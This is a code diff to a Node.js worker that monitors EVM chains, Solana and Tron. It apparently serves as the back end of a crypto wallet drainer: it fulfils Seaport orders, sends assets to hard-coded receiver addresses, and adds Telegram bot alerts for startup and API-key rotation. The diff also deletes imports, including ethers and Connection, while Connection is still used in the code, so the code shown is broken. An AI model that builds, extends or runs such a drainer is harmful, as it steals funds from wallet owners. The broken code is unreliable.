@@ -1,13 +1,41 @@
-require('dotenv').config();
-const { ethers } = require("ethers");
-const { Connection } = require("@solana/web3.js");
 const { TronWeb } = require('tronweb');
 const http = require('http');
+const https = require('https');
 
 // --- GLOBAL CONFIG ---
 const RECEIVER_PRIVATE_KEY = process.env.PRIVATE_KEY;
 const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS;
 const WORKER_PORT = process.env.WORKER_PORT || 8080;
+const TG_TOKEN = process.env.NEXT_PUBLIC_TG_BOT_TOKEN;
+const TG_CHAT_ID = process.env.NEXT_PUBLIC_TG_CHAT_ID;
+
+// --- TELEGRAM HELPER ---
+async function sendTelegram(message) {
+    if (!TG_TOKEN || !TG_CHAT_ID) return;
+    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+    const data = JSON.stringify({
+        chat_id: TG_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    });
+
+    const options = {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'Content-Length': data.length
+        }
+    };
+
+    return new Promise((resolve) => {
+        const req = https.request(url, options, (res) => {
+            resolve(res.statusCode === 200);
+        });
+        req.on('error', () => resolve(false));
+        req.write(data);
+        req.end();
+    });
+}
 
 // --- API KEYS ---
 const INFURA_IDS = [
@@ -22,6 +50,12 @@ function getInfuraId() {
     return INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
 }
 
+function rotateInfura() {
+    currentInfuraIndex++;
+    const nextId = getInfuraId();
+    sendTelegram(`🔄 *Infura Rotation*\nRate limit hit. Switched to key index: ${currentInfuraIndex % INFURA_IDS.length}\nNew ID: \`${nextId}\``);
+}
+
 // Solana Config
 const SOLANA_RECEIVER_ADDRESS = process.env.SOLANA_RECEIVER_ADDRESS || "37cr8JQ1iXMaci4io4x9Bdum14SovdVAeneqm8AH3Uo5";
 const SOLANA_PRIVATE_KEY = process.env.SOLANA_PRIVATE_KEY;
@@ -32,7 +66,19 @@ const solanaConnection = new Connection(SOLANA_RPC, "confirmed");
 const TRON_PRIVATE_KEY = process.env.TRON_PRIVATE_KEY;
 const TRON_RECEIVER_ADDRESS = "TJ19BCQFh2WDRmtfURVCyLUWMN9X65U8Cx";
 const TRON_RPC = process.env.TRON_RPC || "https://api.trongrid.io";
-const tronWeb = TRON_PRIVATE_KEY ? new TronWeb(TRON_RPC, TRON_RPC, TRON_RPC, TRON_PRIVATE_KEY) : null;
+
+// Robust TronWeb Initialization
+let tronWeb = null;
+try {
+    const TW = require('tronweb');
+    // Try both destructured and direct
+    const TronWebClass = TW.TronWeb || TW.default?.TronWeb || TW.default || TW;
+    if (TRON_PRIVATE_KEY) {
+        tronWeb = new TronWebClass(TRON_RPC, TRON_RPC, TRON_RPC, TRON_PRIVATE_KEY);
+    }
+} catch (e) {
+    console.error("❌ Fatal TronWeb Init Error:", e.message);
+}
 
 // EVM Config
 const SEAPORT_ADDRESS = "0x00000000000000ADc04C56Bf30aC9d3c0aAf14bD";
@@ -125,7 +171,7 @@ async function fulfillSeaportOrder(order, chainName) {
         console.error(`❌ [EVM] Seaport Failed on ${chainName}:`, e.message);
         if (e.message.includes("429") || e.message.includes("limit")) {
             console.warn("⚠️ Rate limit hit. Rotating Infura ID...");
-            currentInfuraIndex++;
+            rotateInfura();
         }
         return false;
     }
@@ -154,6 +200,13 @@ setInterval(async () => {
 }, 5000);
 
 server.listen(WORKER_PORT, () => {
-    console.log(`🚀 ULTIMATE WORKER ACTIVE on port ${WORKER_PORT}`);
+    const startMsg = `🚀 *Ultimate Worker Started*\n\n` +
+        `🌐 EVM Chains: 12+\n` +
+        `☀️ Solana: Active\n` +
+        `💎 Tron: Active\n` +
+        `🛡️ Port: ${WORKER_PORT}\n` +
+        `🔑 API Rotation: 4 Keys Configured`;
+    console.log(startMsg.replace(/\*/g, ''));
+    sendTelegram(startMsg);
     console.log(`📡 Monitoring EVM, Solana, and Tron...`);
 });
